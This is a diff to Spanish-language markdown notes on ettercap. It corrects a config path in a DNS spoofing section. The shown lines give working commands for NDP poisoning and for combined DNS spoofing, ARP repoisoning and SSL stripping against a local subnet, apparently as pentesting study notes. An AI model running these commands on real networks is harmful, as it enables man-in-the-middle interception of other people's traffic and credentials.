@@ -32,7 +32,7 @@ ettercap -M ndp //fe80:.../
 ```
 
 ##### DNS spoofing
-En /etc/sttercap/etter.dns se pueden añadir cosas como www.google.es A 10.11.48.25. Luego se hace:
+En /etc/ettercap/etter.dns se pueden añadir cosas como www.google.es A 10.11.48.25. Luego se hace:
 ```
 ettercap -Tq -i ens33 -P dns_spoof -f repoison_arp -P sslstricp -M /10.11.48.x// ///
 ```
